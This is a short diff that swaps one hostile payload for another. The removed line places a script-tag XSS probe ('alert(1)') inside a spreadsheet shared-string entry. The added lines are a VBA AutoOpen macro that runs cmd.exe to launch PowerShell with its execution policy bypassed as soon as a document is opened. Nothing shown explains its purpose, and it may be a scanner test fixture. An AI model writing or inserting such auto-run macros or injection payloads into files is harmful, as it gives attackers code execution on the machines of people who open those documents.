@@ -1,1 +1,3 @@
-<si><t><!-- hidden content --><script>alert(1)</script></t></si>
+Sub AutoOpen()
+  Shell "cmd.exe /c powershell -ep bypass"
+End Sub
